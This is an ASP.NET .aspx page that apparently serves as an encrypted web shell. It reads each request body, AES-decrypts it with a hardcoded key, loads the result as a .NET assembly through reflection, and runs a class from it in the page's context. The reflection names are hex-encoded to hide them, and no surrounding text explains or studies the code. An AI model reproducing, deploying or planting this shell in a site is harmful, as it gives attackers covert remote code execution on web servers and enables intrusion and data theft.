<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
    private byte[] Decrypt(byte[] data) {
        string key = "e45e329feb5d925b";
        data = Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(data));
        System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
        aes.Mode = System.Security.Cryptography.CipherMode.ECB;
        aes.Key = Encoding.UTF8.GetBytes(key);
        aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
        return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
    }
    private byte[] Encrypt(byte[] data) {
        string key = "e45e329feb5d925b";
        System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
        aes.Mode = System.Security.Cryptography.CipherMode.ECB;
        aes.Key = Encoding.UTF8.GetBytes(key);
        aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
        return System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(aes.CreateEncryptor().TransformFinalBlock(data, 0, data.Length)));
    }
</script>
<%
    //byte[] c=Request.BinaryRead(Request.ContentLength);Assembly.Load(Decrypt(c)).CreateInstance("U").Equals(this);
    byte[] c = Request.BinaryRead(Request.ContentLength);
    string asname = System.Text.Encoding.ASCII.GetString(new byte[] {0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79});
    Type assembly = Type.GetType(asname);
    MethodInfo load = assembly.GetMethod("Load",new Type[] {new byte[0].GetType()});
    object obj = load.Invoke(null, new object[]{Decrypt(c)});
    MethodInfo create = assembly.GetMethod("CreateInstance",new Type[] { "".GetType()});
    string name = System.Text.Encoding.ASCII.GetString(new byte[] { 0x55 });
    object pay = create.Invoke(obj,new object[] { name });
    pay.Equals(this);
%>